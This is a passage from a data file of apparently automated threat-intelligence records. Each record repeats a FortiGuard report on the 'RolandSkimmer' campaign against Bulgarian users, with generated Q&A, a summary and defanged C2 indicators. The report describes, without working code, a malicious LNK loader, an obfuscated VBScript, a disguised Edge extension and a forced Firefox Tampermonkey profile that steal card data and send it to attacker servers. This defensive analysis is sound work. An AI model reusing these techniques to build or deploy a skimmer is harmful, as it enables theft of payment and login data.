(beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["malicious", "banking trojan", "apt", "phishing", "analysis", "bank", "botnet", "intelligence", "browser", "threat"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and social engineering, to harvest and exfiltrate sensitive financial data from affected users. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this threat is high, as it can lead to the theft of sensitive credit card information, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["bank", "browser", "malicious", "apt", "analysis", "threat", "intelligence", "phishing", "banking trojan", "botnet"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript 